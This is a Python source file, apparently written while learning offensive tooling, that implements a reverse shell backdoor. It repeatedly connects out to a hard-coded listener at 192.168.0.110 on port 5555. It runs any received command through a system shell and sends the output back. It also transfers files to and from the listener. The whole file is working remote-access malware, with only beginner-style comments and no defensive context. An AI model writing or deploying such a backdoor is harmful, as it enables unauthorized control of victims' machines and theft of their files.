import socket
import subprocess
import json
import time
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    # In python3 to send data over sockets we need to encode the data
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            # recv takes number of bytes to receive
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def connection():
    while True:
        print('[*] Trying to connect!')
        time.sleep(1)
        try:
            # Try connecting to listener
            listener_ip = '192.168.0.110'
            listener_port = 5555
            s.connect((listener_ip, listener_port))
            
            shell()
            
            # Close socket
            s.close()
            break       
        except:
            # Repeatedly try to connect
            connection()

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def download_file(file_name):
    # wb = write bytes
    # Opening new file to write to it
    f = open(file_name, 'wb')
    # https://www.kite.com/python/answers/how-to-set-a-timeout-on-a-socket-receiving-data-in-python
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        # End of file
        except socket.timeout as e:
            break

    s.settimeout(None)
    f.close()

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            s.close()
            break
        elif command[:3] == 'cd ':
            # change directory
            os.chdir(command[3:])
        elif command == 'clear':
            pass
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:]) 
        else:
            # Popen = Process open
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            # As result is already encoded
            result = result.decode()
            print(result)
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()